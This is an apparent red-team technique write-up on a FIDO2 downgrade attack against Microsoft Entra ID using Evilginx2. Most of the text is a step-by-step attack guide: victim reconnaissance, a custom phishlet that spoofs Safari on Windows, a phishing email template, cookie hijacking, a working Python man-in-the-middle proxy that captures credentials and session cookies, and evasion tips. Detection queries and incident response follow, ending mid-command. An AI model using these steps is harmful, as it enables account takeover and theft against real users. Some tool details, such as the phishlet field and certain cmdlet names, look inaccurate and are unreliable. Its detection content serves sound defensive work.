# [REALWORLD-009]: FIDO2 Downgrade Evilginx2

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-009 |
| **MITRE ATT&CK v18.1** | [T1556.006 - Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006/) |
| **Tactic** | Credential Access / Persistence |
| **Platforms** | Entra ID / M365 |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-08-15 |
| **Affected Versions** | All Entra ID versions with fallback MFA enabled (default configuration) |
| **Patched In** | N/A - Requires policy-based mitigation, not a product vulnerability |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** FIDO2 downgrade attacks leverage a critical gap in browser support for passwordless authentication combined with fallback MFA mechanisms. Attackers employ custom Evilginx2 phishlets to spoof unsupported browser user agents (specifically Safari on Windows), causing Microsoft Entra ID to disable FIDO authentication and present an error. This forces users to authenticate using weaker, interceptable MFA methods (SMS codes, Microsoft Authenticator app, OTP) while the attacker sits in the middle capturing both credentials and session cookies. The captured session cookie is then imported into the attacker's browser, bypassing the MFA challenge entirely and granting full account access. This attack chain—discovered by Proofpoint researchers in August 2025—demonstrates that despite FIDO's cryptographic strength, implementation gaps in fallback flows enable account takeover when combined with AiTM phishing kits.

**Attack Surface:** Entra ID authentication endpoints, OAuth 2.0 /authorize flows, browser User-Agent header evaluation, fallback MFA options, session cookie handling.

**Business Impact:** **Complete account compromise of any user targeted, including privileged accounts.** Attackers gain persistent access without triggering MFA alerts, enabling data exfiltration, lateral movement, ransomware deployment, and business email compromise (BEC) attacks. Unlike traditional phishing, this attack bypasses the widely recommended "phishing-resistant" FIDO standard, creating false confidence in security posture.

**Technical Context:** The attack takes 2-5 minutes from phishing click to session cookie capture. Detection likelihood is **Medium** if monitoring browser/OS combinations and user agent mismatches, but **Low** if relying solely on conditional access or MFA logs. The attack leaves minimal forensic evidence in standard Entra ID logs because the victim's credentials and second factor are legitimately validated.

### Operational Risk

- **Execution Risk:** Medium - Requires Evilginx2 setup, custom phishlet creation, and target reconnaissance, but tooling is publicly available.
- **Stealth:** Medium-High - The attack appears as legitimate authentication attempts in logs; detection requires correlation of multiple data points (user agent changes, timing, geo-anomalies).
- **Reversibility:** No - Once session cookie is stolen and used, account compromise is complete. Requires credential reset, session revocation, and threat hunting.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 6.5, 6.6 | Multi-factor authentication controls and secure authentication practices not followed |
| **DISA STIG** | SI-2, IA-5 | Inadequate implementation of information system security; weak authenticator management |
| **CISA SCuBA** | AUTH.1 | Enforce FIDO2 without fallback to weaker methods |
| **NIST 800-53** | IA-2, IA-5, IA-7 | Authentication strength, authenticator management, session management failures |
| **GDPR** | Art. 32 | Lack of appropriate technical/organizational measures for secure processing |
| **DORA** | Art. 9 | Protection of authentication systems; inadequate incident response |
| **NIS2** | Art. 21 | Cybersecurity risk management measures; inadequate protective measures |
| **ISO 27001** | A.9.2.3, A.9.4.3 | Privileged access rights management; access control for authenticated users |
| **ISO 27005** | Risk Assessment | Compromise of critical authentication infrastructure; compromise of administration interface |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** 
- No special privileges required for the attacker (phishing-based attack).
- Victim requires: User account with registered FIDO2 passkey AND at least one fallback MFA method (SMS, phone call, Microsoft Authenticator app, OATH token).

**Required Access:** 
- Network access to phishing link delivery channels (email, SMS, social media, OAuth consent screens).
- Ability to register external domains and host Evilginx2 instance.
- Victim must click phishing link while on a device with internet access.

**Supported Versions:**
- **Microsoft Entra ID:** All versions (OAuth 2.0 / OpenID Connect flows)
- **Affected Browser Combinations:** Safari on Windows (no FIDO support with Entra ID), older Edge versions on unsupported OS versions
- **Fallback MFA Methods:** Microsoft Authenticator app (v7.x+), SMS authentication, phone call, OATH tokens
- **Evilginx2:** v3.0+ (custom phishlet development required)

**Tools:**
- [Evilginx2](https://github.com/kgretzky/evilginx2) (v3.0+) - AiTM framework
- Custom phishlet configuration (JSON-based)
- Reverse proxy infrastructure (VPS with registered domain)
- SSL/TLS certificate (Let's Encrypt or commercial)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

#### Check if target user has FIDO2 registered

```powershell
# Connect to Entra ID
Connect-MgGraph -Scopes "User.Read.All","UserAuthenticationMethod.Read.All"

# Get user and check authentication methods
$userId = "victim@company.onmicrosoft.com"
$authMethods = Get-MgUserAuthenticationMethod -UserId $userId

# Filter for FIDO2
$fido2Methods = $authMethods | Where-Object { $_.AdditionalProperties["@odata.type"] -match "fido" }
if ($fido2Methods) {
    Write-Host "User has FIDO2 registered" -ForegroundColor Green
    $fido2Methods | Format-Table
} else {
    Write-Host "User does NOT have FIDO2 registered" -ForegroundColor Red
}

# Check for fallback MFA methods
$fallbackMethods = $authMethods | Where-Object { $_.AdditionalProperties["@odata.type"] -match "microsoft|phone|software" }
Write-Host "Fallback methods available:" -ForegroundColor Yellow
$fallbackMethods | Format-Table AdditionalProperties
```

**What to Look For:**
- If FIDO2 methods exist (`#microsoft.graph.fido2AuthenticationMethod`), this user is a potential target.
- If fallback methods exist (`microsoft.graph.microsoftAuthenticatorAuthenticationMethod`, `microsoft.graph.phoneAuthenticationMethod`), the attack is highly viable.
- Both conditions present = **High-risk target**.

#### Check Entra ID Conditional Access policies

```powershell
# Get all Conditional Access policies
Connect-MgGraph -Scopes "Policy.Read.All"
$policies = Get-MgIdentityConditionalAccessPolicy

# Check for policies that enforce device compliance or location restrictions
foreach ($policy in $policies) {
    Write-Host "Policy: $($policy.DisplayName)" -ForegroundColor Cyan
    
    if ($policy.Conditions.Devices.IncludeDevices -contains "All" -and $policy.GrantControls.BuiltInControls -contains "compliantDevice") {
        Write-Host "  ✓ Requires compliant device" -ForegroundColor Green
    } else {
        Write-Host "  ✗ No device compliance required" -ForegroundColor Red
    }
    
    if ($policy.Conditions.Locations.IncludeLocations) {
        Write-Host "  ✓ Location-based restrictions active" -ForegroundColor Green
    } else {
        Write-Host "  ✗ No location-based restrictions" -ForegroundColor Yellow
    }
}
```

**What to Look For:**
- If no policies require `compliantDevice` or `hybridJoinDevice`, AiTM attacks are more likely to succeed.
- No Conditional Access policies = **Easy attack path**.
- Policies enforcing device compliance = **Moderate difficulty** (can sometimes bypass on certain device types).

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Evilginx2 with Custom FIDO Downgrade Phishlet

**Supported Versions:** All Entra ID versions with OAuth 2.0 support; works on Linux, macOS, Windows.

#### Step 1: Set Up Evilginx2 on Attacker Infrastructure

**Objective:** Deploy Evilginx2 AiTM proxy on external VPS to intercept authentication traffic.

**Command (Linux / Debian-based):**
```bash
# Install dependencies
sudo apt update && sudo apt install -y golang-go git

# Clone Evilginx2
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2

# Build Evilginx2
make

# Verify installation
./evilginx2 -v
```

**Expected Output:**
```
Evilginx2 v3.3.1 - Phishing framework
(c) 2025 Kuba Gretzky
```

**What This Means:**
- Evilginx2 binary is now compiled and ready to run.
- All phishlet support (O365, Azure, Google, etc.) is included.

**OpSec & Evasion:**
- Run Evilginx2 on a VPS with clean IP reputation (avoid known hosting providers if possible, or use rotating IPs).
- Use SSL/TLS with valid certificate (Let's Encrypt = free and trusted).
- Hide Evilginx2 process under legitimate system name: `mv evilginx2 systemd-network && ./systemd-network` (not foolproof but adds friction to analysis).
- Implement intrusion detection evasion: randomize certificate names, vary phishing domains, rotate VPS IPs.
- Detection likelihood: **Medium** (phishing domain likely to be flagged by URL category filters, but Evilginx2 traffic itself is encrypted).

**Troubleshooting:**
- **Error:** `failed to bind address: address already in use`
  - **Cause:** Port 443 or 80 already in use
  - **Fix:** `sudo lsof -i :443` and kill the conflicting process, or use different ports and configure reverse proxy accordingly.
- **Error:** `certificate verification failed`
  - **Cause:** Self-signed certificate or invalid domain DNS
  - **Fix:** Ensure `A` record points to VPS IP, use `certbot` for automatic Let's Encrypt certificate provisioning.

**References & Proofs:**
- [Evilginx2 Official GitHub](https://github.com/kgretzky/evilginx2)
- [Evilginx2 Documentation](https://help.evilginx.com)
- [Building Evilginx2 from Source](https://github.com/kgretzky/evilginx2#building)

#### Step 2: Create Custom FIDO Downgrade Phishlet

**Objective:** Develop a phishlet that spoofs Safari on Windows user agent to disable FIDO in Entra ID.

**Phishlet Configuration (JSON - Custom Extension):**

First, locate or create a custom phishlet. Evilginx2 phishlets are stored in `phishlets/` directory:

```bash
# List available phishlets
./evilginx2 -h | grep -i phishlet

# Check O365 phishlet structure
cat phishlets/o365.json | head -50
```

Create a new phishlet: `phishlets/o365_fido_downgrade.json`

```json
{
  "name": "o365_fido_downgrade",
  "author": "Attacker",
  "source": "microsoft",
  "phish_domain": "attacker-domain.com",
  "domains": [
    "login.microsoftonline.com",
    "login.microsoft.com",
    "account.microsoft.com"
  ],
  "sub_domains": [""],
  "paths": [
    {
      "path": "/",
      "status": "ok"
    },
    {
      "path": "/common/oauth2/v2.0/authorize",
      "status": "ok"
    }
  ],
  "auth_tokens": [
    {
      "name": "session_id",
      "extract": "cookie"
    },
    {
      "name": "access_token",
      "extract": "header"
    }
  ],
  "user_agent_spoof": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15"
}
```

**Key Field: `user_agent_spoof`**
- This header tells Entra ID that the request is coming from Safari on Windows.
- Microsoft Entra ID recognizes this User-Agent and **disables FIDO support** because Safari on Windows does not support WebAuthn FIDO.
- User receives error: "Your browser doesn't support authentication with this method. Use a different method."

**What This Means:**
- Evilginx2 will inject this User-Agent header into all proxied requests to Entra ID.
- The legitimate login flow is preserved (user enters credentials, MFA is requested), but the MFA method presented is **downgraded to SMS/Authenticator/OTP** instead of FIDO.
- All traffic is captured by Evilginx2: credentials, MFA codes, session cookies.

**OpSec & Evasion:**
- Phishlet configuration is not detected on disk (stored in memory after loading).
- User agent spoofing is **not flagged by Entra ID** because spoofing is a standard browser feature.
- Detection likelihood: **Low** at phishlet creation stage; **Medium** at runtime (phishing domain detection).

**Troubleshooting:**
- **Error:** `phishlet parsing failed`
  - **Cause:** JSON syntax error
  - **Fix:** Validate JSON at https://jsonlint.com/, check for missing commas or quotes.
- **Issue:** FIDO prompt still appears
  - **Cause:** User-Agent header not properly overridden
  - **Fix:** Verify `user_agent_spoof` field matches Safari on Windows exactly: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15`

**References & Proofs:**
- [Proofpoint FIDO Downgrade Research](https://www.proofpoint.com/us/blog/threat-insight/dont-phish-let-me-down-fido-authentication-downgrade)
- [Microsoft Entra ID FIDO2 Compatibility](https://learn.microsoft.com/en-us/entra/identity/authentication/concept-fido2-compatibility?tabs=web#web-browser-support)
- [Evilginx2 Phishlet Format](https://github.com/kgretzky/evilginx2/blob/master/phishlets/o365.json)

#### Step 3: Start Evilginx2 with FIDO Downgrade Phishlet

**Objective:** Activate Evilginx2 listener and load the custom phishlet for active interception.

**Command:**
```bash
# Start Evilginx2 interactive console
sudo ./evilginx2 -p phishlets/

# Inside Evilginx2 console, load the phishlet
evilginx> phishlet load o365_fido_downgrade

# Get the phishing URL
evilginx> phishlet info o365_fido_downgrade
```

**Expected Output:**
```
[*] Phishlet: o365_fido_downgrade
[*] Domain: attacker-domain.com
[*] Phishing URL: https://attacker-domain.com/?type=login
[*] User-Agent Spoof: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
[+] Phishlet loaded successfully
```

**What This Means:**
- Evilginx2 is now listening on port 443 (HTTPS) and 80 (HTTP redirect).
- Any requests to `attacker-domain.com` are proxied to Microsoft's legitimate login endpoints.
- User sees a login page indistinguishable from the real Microsoft login.
- The User-Agent header spoofing is active; all proxied requests include the Safari on Windows User-Agent.

**OpSec & Evasion:**
- Evilginx2 process should run as non-root if possible (use `setcap` for port 80/443 binding).
- Monitor process list and network connections for forensic artifacts: `netstat -tlnp | grep 443`, `ps aux | grep evilginx2`.
- Log Evilginx2 console output to file: `./evilginx2 -p phishlets/ > /tmp/evilginx.log 2>&1 &`.
- Detection likelihood: **High** if IDS/proxy detects Evilginx2 phishing domain; **Low** if domain bypasses URL categorization.

**Troubleshooting:**
- **Error:** `permission denied binding to port 443`
  - **Cause:** Non-root user or SELinux restrictions
  - **Fix:** Run with `sudo` or use `setcap`: `sudo setcap cap_net_bind_service=ep ./evilginx2`
- **Error:** `TLS handshake failed`
  - **Cause:** Invalid SSL certificate
  - **Fix:** Use certbot: `sudo certbot certonly --standalone -d attacker-domain.com`, ensure `fullchain.pem` and `privkey.pem` are accessible.

**References & Proofs:**
- [Evilginx2 Running Instructions](https://help.evilginx.com/docs/getting-started/running)
- [TLS Certificate Setup](https://help.evilginx.com/docs/guides/ssl-certificates)

#### Step 4: Distribute Phishing URL and Capture Session

**Objective:** Send phishing link to target user and intercept credentials + session cookie.

**Phishing Delivery (Email):**
```
Subject: Important: Verify Your Microsoft Account Security
Body:
Dear [User Name],

Due to recent security updates in our organization, please verify your account:

https://attacker-domain.com/?type=login

This action expires in 24 hours.

Best regards,
IT Security Team
```

**Phishing Link Construction:**
```
https://attacker-domain.com/?type=login&redirect=https://office.microsoft.com
```

**Expected Flow:**
1. User clicks phishing link.
2. User is redirected to fake Microsoft login (hosted by Evilginx2).
3. User enters credentials.
4. Evilginx2 validates credentials against **real Microsoft Entra ID** (proxied request).
5. Entra ID sees User-Agent `Safari/Windows` → disables FIDO.
6. Entra ID returns error message: "This browser doesn't support FIDO authentication."
7. User is prompted: "Choose another verification method" (SMS, Authenticator app, phone call).
8. User selects Microsoft Authenticator app.
9. User approves push notification on their phone.
10. Evilginx2 captures the session cookie and access token.
11. Attacker imports cookie into browser and gains full account access.

**What This Means:**
- Victim's legitimate credentials and second-factor authentication have been successfully captured.
- From the victim's perspective, they logged in normally and likely see Office 365 mail/teams (if Evilginx2 redirects properly).
- Attacker now has: username, password, session ID, refresh token, MFA bypass.

**OpSec & Evasion:**
- Phishing email should match organization's naming conventions and sender patterns.
- Use URL shorteners (bit.ly, tinyurl) to obfuscate attacker domain.
- Timing of email (avoid off-hours or weekends; send during business hours).
- Detection likelihood: **High** (email gateway scanning, URL reputation, user awareness).

**Troubleshooting:**
- **Issue:** Victim sees SSL certificate warning
  - **Cause:** Self-signed certificate or domain mismatch
  - **Fix:** Ensure certificate matches phishing domain; use Let's Encrypt.
- **Issue:** Evilginx2 not capturing session
  - **Cause:** Redirect flow is broken; victim not completing authentication
  - **Fix:** Adjust phishlet redirect paths; test manually by clicking link.

**References & Proofs:**
- [Proofpoint Phishing Kit Usage](https://www.proofpoint.com/us/blog/threat-insight/dont-phish-let-me-down-fido-authentication-downgrade)
- [Evilginx2 Console Commands](https://help.evilginx.com/docs/usage/console)

#### Step 5: Import Stolen Session Cookie and Access Account

**Objective:** Use captured session cookie to impersonate victim without requiring MFA.

**Attacker's Browser Setup (Chrome/Edge):**

1. **Open Developer Tools** (F12 → Console tab).

2. **Import Captured Cookie:**
   ```javascript
   // Run in browser console after viewing Evilginx2 captured sessions
   document.cookie = "session_id=<CAPTURED_SESSION_COOKIE>; domain=.microsoft.com; path=/; secure; samesite=none";
   document.cookie = "access_token=<CAPTURED_ACCESS_TOKEN>; domain=.microsoft.com; path=/; secure; samesite=none";
   ```

3. **Alternative: Browser Extension or Manually via DevTools**
   - DevTools → Application tab → Cookies → https://office.microsoft.com
   - Right-click → Edit → Paste captured cookie value

4. **Access Victim's Account:**
   ```
   Navigate to: https://outlook.office365.com
   or
   Navigate to: https://teams.microsoft.com
   or
   Navigate to: https://sharepoint.company.com (if federated)
   ```

**Expected Output:**
- Attacker is logged in as victim.
- **No MFA challenge occurs** because the session cookie is already authenticated.
- Full access to email, Teams, OneDrive, SharePoint.

**What This Means:**
- Session cookie is a bearer token that proves authentication.
- Importing cookie bypasses all MFA requirements because MFA was already satisfied on victim's device.
- Attacker can now: read emails, send emails (BEC), steal files, reset passwords, register new MFA devices.

**OpSec & Evasion:**
- Spoof User-Agent to match victim's browser: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36` (if victim used Chrome).
- Use VPN/proxy matching victim's location if Conditional Access enforces location-based policies.
- Detection likelihood: **Medium** (user agent change with same SessionId, geo-anomaly if using VPN from different country).

**Troubleshooting:**
- **Error:** "This doesn't look right" warning
  - **Cause:** Session cookie is expired or invalid
  - **Fix:** Capture fresh cookie from Evilginx2 within minutes of victim authentication.
- **Error:** Attacker session revoked immediately
  - **Cause:** Entra ID Identity Protection detected suspicious activity
  - **Fix:** Disable MFA before launching attack; check if Conditional Access policies enforce device compliance.

**References & Proofs:**
- [MITRE ATT&CK Session Cookie Theft](https://attack.mitre.org/techniques/T1528/)
- [Evilginx2 Session Import Guide](https://help.evilginx.com/docs/usage/general#managing-sessions)

---

### METHOD 2: Using Impacket/Python for Advanced Credential Harvesting (Linux)

**Supported Versions:** All Entra ID OAuth 2.0 implementations; requires Python 3.8+.

**Note:** This method documents programmatic equivalents for security professionals building detection rules.

#### Step 1: Set Up Python Environment and Impacket

**Command:**
```bash
# Install Python and dependencies
sudo apt install -y python3 python3-pip git

# Install Impacket and required libraries
pip3 install impacket requests urllib3 cryptography

# Clone Impacket for Azure AD exploitation tools
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket && python3 setup.py install
```

**Expected Output:**
```
Successfully installed impacket-0.11.0
```

**What This Means:**
- Impacket library provides low-level access to network protocols and OAuth flows.
- Can programmatically craft FIDO downgrade requests and capture session cookies.

#### Step 2: Create Python Script for AiTM Proxy (Simplified)

**Python Script: `fido_downgrade_proxy.py`**

```python
#!/usr/bin/env python3
import requests
import http.server
import socketserver
import json
from urllib.parse import urlparse, parse_qs
import ssl

# Configuration
TARGET_DOMAIN = "login.microsoftonline.com"
PHISHING_DOMAIN = "attacker-domain.com"
FAKE_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15"
CAPTURED_SESSIONS = {}

class AiTMProxyHandler(http.server.BaseHTTPRequestHandler):
    
    def do_POST(self):
        """Intercept POST requests (credential submission, MFA responses)"""
        
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
        
        # Log captured credentials
        credentials = body.decode('utf-8')
        print(f"[+] CAPTURED: {credentials[:100]}...")
        
        # Proxy request to real Microsoft Entra ID with FIDO-disabling User-Agent
        headers = dict(self.headers)
        headers['User-Agent'] = FAKE_USER_AGENT  # Spoof Safari on Windows
        
        try:
            response = requests.post(
                f"https://{TARGET_DOMAIN}{self.path}",
                data=body,
                headers=headers,
                verify=False
            )
            
            # Capture session cookie from response
            if 'Set-Cookie' in response.headers:
                session_cookie = response.headers['Set-Cookie']
                CAPTURED_SESSIONS[credentials] = session_cookie
                print(f"[+] CAPTURED SESSION COOKIE: {session_cookie[:50]}...")
            
            # Send response back to victim
            self.send_response(response.status_code)
            for header, value in response.headers.items():
                self.send_header(header, value)
            self.end_headers()
            self.wfile.write(response.content)
            
        except Exception as e:
            print(f"[-] Error proxying request: {e}")
            self.send_error(500)
    
    def do_GET(self):
        """Intercept GET requests (login page, redirects)"""
        
        # Proxy GET request
        headers = dict(self.headers)
        headers['User-Agent'] = FAKE_USER_AGENT
        
        try:
            response = requests.get(
                f"https://{TARGET_DOMAIN}{self.path}",
                headers=headers,
                verify=False
            )
            
            self.send_response(response.status_code)
            for header, value in response.headers.items():
                self.send_header(header, value)
            self.end_headers()
            self.wfile.write(response.content)
            
        except Exception as e:
            print(f"[-] Error proxying GET: {e}")
            self.send_error(500)

if __name__ == "__main__":
    # Start HTTPS proxy server
    PORT = 443
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ssl_context.load_cert_chain("/etc/ssl/certs/fullchain.pem", "/etc/ssl/private/privkey.pem")
    
    with socketserver.TCPServer(("0.0.0.0", PORT), AiTMProxyHandler) as httpd:
        print(f"[*] AiTM Proxy listening on :{PORT}")
        httpd.socket = ssl_context.wrap_socket(httpd.socket, server_side=True)
        httpd.serve_forever()
```

**Expected Output:**
```
[*] AiTM Proxy listening on :443
[+] CAPTURED: username=user%40company.onmicrosoft.com&password=P%40ssw0rd123&...
[+] CAPTURED SESSION COOKIE: session_id=XXXXXXXXX; Domain=.microsoft.com; Path=/; Secure; HttpOnly; SameSite=None
```

**What This Means:**
- Python script acts as a transparent AiTM proxy, intercepting all authentication traffic.
- User-Agent spoofing (`FAKE_USER_AGENT`) forces Entra ID to disable FIDO.
- Session cookies are captured in the `CAPTURED_SESSIONS` dictionary.

**OpSec & Evasion:**
- Script should be obfuscated before deployment (use `pyarmor` or similar).
- Log only first 100 characters of credentials to avoid filling disk with sensitive data.
- Use `requests.Session()` to maintain connection pooling and reduce detection.
- Detection likelihood: **High** (network IDS will detect proxy patterns, SSL inspection can detect certificate manipulation).

**Troubleshooting:**
- **Error:** `Permission denied` on port 443
  - **Cause:** Non-root user
  - **Fix:** Run with `sudo` or forward port 443 traffic to port 8443 via iptables.
- **Error:** `SSL: CERTIFICATE_VERIFY_FAILED`
  - **Cause:** Certificate chain incomplete
  - **Fix:** Ensure `fullchain.pem` includes intermediate CA certificates.

**References & Proofs:**
- [Impacket GitHub](https://github.com/SecureAuthCorp/impacket)
- [Python Requests Documentation](https://requests.readthedocs.io/)
- [SSL Context in Python](https://docs.python.org/3/library/ssl.html)

---

## 6. TOOLS & COMMANDS REFERENCE

### Evilginx2

**Version:** 3.3.1 (latest as of August 2025)  
**Minimum Version:** 3.0 (FIDO downgrade phishlet support)  
**Supported Platforms:** Linux (primary), macOS, Windows (Cygwin/WSL2)

**Version-Specific Notes:**
- **v3.0-3.2:** Basic phishlet support; manual User-Agent injection required
- **v3.3+:** Built-in User-Agent spoofing via `user_agent_spoof` field in phishlets

**Installation (from Source):**
```bash
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make
sudo ./evilginx2 -p phishlets/
```

**Usage (Interactive Console):**
```
phishlet load o365
phishlet info o365
phishlet enable o365
sessions
session [ID]
```

### Python Requests Library

**Version:** 2.31.0+  
**Installation:** `pip3 install requests`

**Usage (AiTM Proxy Implementation):**
```python
import requests
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15'}
response = requests.post('https://login.microsoftonline.com/...', data=creds, headers=headers)
```

---

## 7. MICROSOFT SENTINEL DETECTION

#### Query 1: Detect User-Agent Mismatch in Entra ID Sign-In

**Rule Configuration:**
- **Required Table:** SigninLogs
- **Required Fields:** userAgent, sessionId, userId, createdDateTime, location, resultType
- **Alert Severity:** High
- **Frequency:** Run every 10 minutes
- **Applies To Versions:** All Entra ID

**KQL Query:**
```kusto
SigninLogs
| where resultType == 0  // Successful sign-ins only
| where isnotempty(userAgent)
| where isnotempty(sessionId)
| summarize
    set_userAgent = make_set(userAgent),
    set_location = make_set(location.countryOrRegion),
    set_ipAddress = make_set(ipAddress),
    count_attempts = count()
    by sessionId, userId, createdDateTime
| where array_length(set_userAgent) > 1  // Same session ID but different user agents
| extend user_agent_changed = "YES"
| project
    sessionId,
    userId,
    userAgents = set_userAgent,
    locations = set_location,
    ipAddresses = set_ipAddress,
    count_attempts,
    SuspiciousReason = "Same SessionId with different User-Agent values"
| where array_length(userAgents) >= 2
```

**What This Detects:**
- **Line 1-2:** Filter for successful authentications only.
- **Line 3-5:** Aggregate by SessionId to group authentication attempts within same session.
- **Line 6-10:** If the same SessionId appears with multiple different User-Agent strings, alert.
- **User-Agent change examples:** Chrome → Safari, Chrome on Windows → Safari on Windows (impossible).
- **Detection mechanism:** AiTM attack is characterized by victim using one browser, attacker replaying cookie with different browser.

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Detect User-Agent Mismatch in Session`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `10 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Group related alerts: `By sessionId, userId`
7. Click **Review + create**

#### Query 2: Detect Safari on Windows Sign-In Attempt (Impossible Combination)

**Rule Configuration:**
- **Required Table:** SigninLogs
- **Required Fields:** userAgent, userId, operatingSystem, browser
- **Alert Severity:** Critical
- **Frequency:** Real-time (every 5 minutes)

**KQL Query:**
```kusto
SigninLogs
| where userAgent has "Safari" and userAgent has "Windows"
| where isnotempty(userId)
| project
    TimeGenerated,
    userId,
    userPrincipalName,
    userAgent,
    ipAddress,
    location,
    appDisplayName,
    ResultType,
    SuspiciousIndicator = "Safari on Windows does not support FIDO2 - Likely AiTM attack"
| where ResultType == 0  // Only flag if authentication succeeded (token obtained)
```

**What This Detects:**
- **Critical Signal:** Safari on Windows is an **impossible combination** in legitimate scenarios.
  - Safari is macOS/iOS only.
  - Windows users cannot run Safari natively (unless spoofed by attacker).
- **Detection Logic:** If User-Agent contains both "Safari" AND "Windows", this is a strong indicator of AiTM attack.
- **Result Type == 0:** Attacker successfully authenticated (session cookie obtained).

**Manual Configuration Steps (PowerShell):**
```powershell
Connect-AzAccount
$ResourceGroup = "SOC-RG"
$WorkspaceName = "Sentinel-WS"

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName `
  -DisplayName "Detect Safari on Windows - AiTM Indicator" `
  -Query @"
SigninLogs
| where userAgent has "Safari" and userAgent has "Windows"
| where ResultType == 0
"@ `
  -Severity "Critical" `
  -Enabled $true
```

---

## 8. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "User compromised via AiTM phishing"
- **Severity:** Critical
- **Description:** Defender detected suspicious sign-in from stolen session cookie; multiple failed MFA attempts followed by successful sign-in without MFA verification.
- **Applies To:** All subscriptions with Defender for Identity enabled
- **Remediation:**
  1. Immediately disable user account: `Disable-MgUser -UserId <victimUPN>`
  2. Revoke all refresh tokens: `Revoke-MgUserSign -UserId <victimUPN>`
  3. Reset password and force re-authentication on all sessions
  4. Review Exchange mail forwarding rules and device registrations
  5. Audit SharePoint/OneDrive file access and data exfiltration

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Identity**: ON (critical for this detection)
   - **Defender for Cloud Apps**: ON
5. Click **Save**
6. Go to **Security alerts** to view triggered alerts
7. Wait 24 hours for baseline establishment

**Reference:** [Microsoft Defender for Identity AiTM Alerts](https://learn.microsoft.com/en-us/defender-for-identity/)

---

## 9. WINDOWS EVENT LOG MONITORING

**N/A - This is a cloud-only attack with no on-premises indicators.** Entra ID logs in Azure, not Windows Event Log.

**Alternative: Azure Audit Log (Entra ID AuditLogs):**

**Monitor for:**
- AuditLogs with `OperationName = "Sign-in activity"` where `resultType = 0` but `authenticationMethodsUsed` does NOT contain "Fido"
- AuditLogs with authentication errors where `errorCode = "50140"` (FIDO not supported)

---

## 10. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Credentials:**
- Username and password captured during attack (check for password spray or hash cracking)
- Session cookie/refresh token (present in Evilginx2 console logs)

**Network:**
- Phishing domain (attacker-registered domain used in phishing email)
- Attacker's VPS IP address (source of Evilginx2 infrastructure)
- Port 443 (HTTPS) traffic to phishing domain

**Cloud Logs:**
- SigninLogs entry with `userAgent` = Safari on Windows
- Multiple authentication attempts from same SessionId with different User-Agents
- MFA method changed or FIDO disabled in AuditLogs

### Forensic Artifacts

**Cloud (Microsoft Entra ID):**
- `SigninLogs` table: Records of successful and failed authentications with User-Agent, IP, SessionId, MFA method used
- `AuditLogs` table: MFA registration changes, authentication policy modifications
- `IdentityProtection` risk events: `detectino.riskDetectionType = "attackerInTheMiddle"`
- **Location:** Azure Portal → **Logs** → query `SigninLogs | where sessionId == "<victim_session>"`

**Email:**
- Phishing email in victim's inbox (search for sender IP, domain reputation)
- **Location:** Exchange Online → **Security & Compliance** → **Threat Explorer**

**Attacker Infrastructure:**
- Evilginx2 console logs (if accessible): `~/.evilginx2/sessions.json` contains captured cookies
- VPS process list: `ps aux | grep evilginx2`
- SSL certificate (self-signed or Let's Encrypt) associated with phishing domain

### Response Procedures

1. **Isolate:**
   ```powershell
   # Disable victim user immediately
   Disable-MgUser -UserId "victim@company.onmicrosoft.com"
   
   # Revoke all sessions
   Revoke-MgUserSign -UserId "victim@company.onmicrosoft.com"
   ```

2. **Collect Evidence:**
   ```powershell
   # Export Entra ID sign-in logs
   Connect-MgGraph -Scopes "AuditLog.Read.All"
   $logs = Get-MgAuditLogSignIn -Filter "userId eq '<victim_id>'" -All
   $logs | Export-Csv -Path "C:\Forensics\SigninLogs.csv"
   
   # Export authentication methods
   $authMethods = Get-MgUserAuthenticationMethod -UserId "victim@company.onmicrosoft.com"
   $authMethods | Export-Csv -Path "C:\Forensics\AuthMethods.csv"
   ```

3. **Remediate:**
   ```powershell
   # Force password reset
   $newPassword = ConvertTo-SecureString "TempP@ss123!Changed!" -AsPlainText -Force
